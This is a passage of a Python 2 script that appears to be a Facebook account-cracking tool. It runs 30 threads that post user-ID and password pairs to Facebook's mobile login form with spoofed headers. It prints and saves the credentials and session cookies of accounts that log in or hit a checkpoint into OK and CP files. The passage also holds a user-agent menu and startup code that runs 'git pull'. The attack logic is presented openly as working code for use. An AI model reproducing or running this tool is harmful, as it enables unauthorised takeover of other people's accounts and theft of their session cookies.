                ses.headers.update({'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
                p = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&refid=8').text
                b = parser(p, 'html.parser')
                bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
                for i in b('input'):
                    try:
                        if i.get('name') in bl:
                            kwargs.update({i.get('name'): i.get('value')})
                        else:
                            continue
                    except:
                        pass

                kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
                gaaa = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', data=kwargs)
                if 'c_user' in ses.cookies.get_dict().keys():
                    kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print '\r\x1b[1;92m[MARK-OK] %s|%s|%s\x1b[1;97m' % (uid, pw, kuki)
                    ok.append('%s|%s' % (uid, pw))
                    open('OK/%s.txt' % tBilall, 'a').write(' + %s|%s\n' % (uid, pw))
                    break
                    continue
                elif 'checkpoint' in ses.cookies.get_dict().keys():
                    print '\r\x1b[1;92m[MARK-OK] %s|%s\x1b[1;97m        ' % (uid, pw)
                    cp.append('%s|%s' % (uid, pw))
                    open('CP/%s.txt' % tBilall, 'a').write(' + %s|%s\n' % (uid, pw))
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    exit('\n\n # [>Program Close<]')


def setting_ua():
    print '[1] CHANGE USER-AGENT'
    print '[2] DEFAULT USER-AGENT'
    ua = raw_input('\n [?] CHOOSE : ')
    if ua == '':
        menu()
    elif ua == '1':
        c_ua = raw_input(' [+] ENTER USER-AGENT : ')
        c_ua = raw_input(' [+] IPHONE  : ')
        c_ua = raw_input(' [+] SAMSUNG : ')
        c_ua = raw_input(' [+] XIAOMI: ')
        c_ua = raw_input(' [+] NOKIA : ')
        c_ua = raw_input(' [+] LINUX: ')
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        raw_input("\n [!] PRESS 'ENTER' TO SAVE USER-AGENT")
        menu()
    elif ua == '2':
        print 'Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        os.system('rm -f .ua')
        time.sleep(1)
        raw_input('\n[\xe2\x80\xa2] USER-AGENT SAVE SUCCESSFULLY')
        menu()


def buat_folder():
    try:
        os.mkdir('CP')
    except:
        pass

    try:
        os.mkdir('OK')
    except:
        pass


if __name__ == '__main__':
    os.system('git pull')
    os.system('touch login.txt')
    buat_folder()
    login()
